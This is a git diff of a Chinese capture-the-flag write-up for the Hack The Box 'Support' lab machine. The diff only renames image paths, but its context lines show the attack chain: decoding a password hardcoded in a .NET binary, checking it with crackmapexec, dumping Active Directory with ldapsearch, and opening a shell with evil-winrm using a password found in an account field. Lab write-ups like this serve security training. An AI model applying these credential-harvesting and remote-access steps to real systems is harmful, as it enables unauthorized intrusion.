@@ -103,7 +103,7 @@ file UserInfo.exe
 
 * 在protected目录下的.cctor()中找到编码后的密码：
 
-<figure><img src="../../.gitbook/assets/19 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/19 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * python IDLE终端解码后得到明文密码：'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 
@@ -117,7 +117,7 @@ enc = b64decode(pass_b64)
 bytearray([e^k^223 for e,k in zip(enc, cycle(key))]).decode()
 ```
 
-<figure><img src="../../.gitbook/assets/20 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/20 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 使用crackmapexec验证一下凭证是否有用：
 
@@ -125,13 +125,13 @@ bytearray([e^k^223 for e,k in zip(enc, cycle(key))]).decode()
 crackmapexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 ```
 
-<figure><img src="../../.gitbook/assets/21 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/21 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### GET SHELL
 
 * 因为该程序的代码中的ldapquery，用的是ldap协议，所以用ldapsearch和当前已获得的有效凭证列举出AD中所有的内容：
 
-<figure><img src="../../.gitbook/assets/23 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/23 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 ldapsearch -H  'ldap://10.129.230.181' -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
@@ -139,7 +139,7 @@ ldapsearch -H  'ldap://10.129.230.181' -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e
 
 * 输出结构特别多，需要仔细查看才能发现其中的support账户里包含了一个info字段，里面的字符串看上去像是密码（因为其他账户没有info这个字段）：
 
-<figure><img src="../../.gitbook/assets/24 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/24 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 尝试使用evil-winrm和这个凭证连接，获取到了shell：
 
@@ -147,7 +147,7 @@ ldapsearch -H  'ldap://10.129.230.181' -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e
 evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
 ```
 
-<figure><img src="../../.gitbook/assets/25 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/25 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/26 (3).png" alt=""><figcaption></figcaption></figure>
 
